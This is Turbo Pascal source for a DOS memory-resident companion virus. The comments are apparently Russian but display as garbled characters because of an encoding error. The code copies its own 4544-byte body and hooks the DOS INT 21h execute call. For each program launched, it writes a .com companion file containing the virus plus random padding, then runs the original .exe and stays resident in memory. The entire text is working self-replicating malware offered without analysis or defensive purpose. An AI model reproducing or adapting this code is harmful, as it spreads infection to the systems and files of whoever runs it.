   {$M 5000, 0, 5000}

   uses dos;
   const virsize=4544;                         {¤«¨  ¢¨àãá }
         com:string[3]='com';                  {¢®â â ª®©  è á¯ãâ¨ª}
   var
    d:dirstr;                                  {¯¥à¥¬¥ë¥ ¤«ï à áç«¥¥¨ï ¨¬¥¨}
    n:namestr;
    e:extstr;
    g:file;
    mas:array[1..virsize] of byte;             {â¥«® ¢¨àãá }
    st,PN:string[80];                          {¨¬¥  à §ë¥}
    Int21h, P: pointer;                        {íâ® ¤«ï ¯à¥àë¢ ¨©}
    A: pointer absolute 0:$84;
    B: pointer absolute 0:$184;
    R: Registers;
    ch:byte;

   {$F+}
   procedure My21h(Flags,CS,IP,AX,BX,CX,DX,SI,DI,DS,ES,BP:Word); interrupt;
   begin
     if AX = $4B00 then                    {…á«¨ ªâ®-â® çâ®-â® § ¯ãáâ¨«...}
     begin
       Move(Ptr(DS, DX)^, PN[1], 80);      {¯®«ãç ¥¬ ¨¬ï â®£®, çâ® § ¯ãáâ¨«¨}
       PN[0] := #$FF;
       PN[0] := Char(Pos(#0, PN) - 1);
       move(com[1],PN[byte(PN[0])-2],3);   {¯®«ãç ¥¬ ¨¬ï á¯ãâ¨ª }
       assign(g,PN);{$I-}reset(g,1);{$I+}
       if ioresult<>0 then                 {¥âã á¯ãâ¨ª ?.. ¡ã¤¥â!}
        begin
         randomize;
         rewrite(g,1);
         blockwrite(g,mas,virsize);        {â¥¯¥àì ¥áâì}
         repeat                            {¨ ¤ ¦¥ á ¬ãá®à®¬}
          ch:=random(256);
          blockwrite(g,ch,1);
         until ch>250;
        end;
       close(g);
     end;
     R.Flags := Flags; R.AX := AX;                   {áâ àë© INT21h «ãçè¥}
     R.BX := BX; R.CX := CX; R.DX := DX; R.SI := SI; {®¢ëå ¤¢ãå}
     R.DI := DI; R.DS := DS; R.ES := ES; R.BP := BP;
     inline($FA); P := B; B := Int21h; inline($FB);
     Intr($61, R);
     inline($FA); B := P; inline($FB);
     Flags := R.Flags; AX := R.AX;
     BX := R.BX; CX := R.CX; DX := R.DX; SI := R.SI;
     DI := R.DI; DS := R.DS; ES := R.ES; BP := R.BP;
   end;
   {$F-}

   begin
    fsplit(paramstr(0),d,n,e);          {¢®â ¬ë ¨ § ¯ãáâ¨«¨áì}
    st:=d+n+'.exe';
    assign(g,st);{$I-}reset(g);{$I+}
    if ioresult=0 then                  {å®§ï¨ ¤®¬ ?}
     begin                              {â®£¤  ¯ãáâì à ¡®â ¥â}
      close(g);
      pn:='';
      for ch:=1 to ParamCount do
       pn:=pn+paramstr(ch)+' ';
      exec(st,pn);
     end;
    assign(g,paramstr(0));
    reset(g,1);
    seek(g,0);
    blockread(g,mas,virsize);           {ç¨â ¥¬  á}
    close(g);
    SwapVectors;                        {¢¥è ¥¬áï   21-¥ ¯à¥àë¢ ¨¥}
    inline($FA);
    Int21h := A;
    A := @My21h;
    inline($FB);
    Keep(0);                            {®áâ ¥¬áï ¢ ¯ ¬ïâ¨}
   end.                                 {Happy end!}
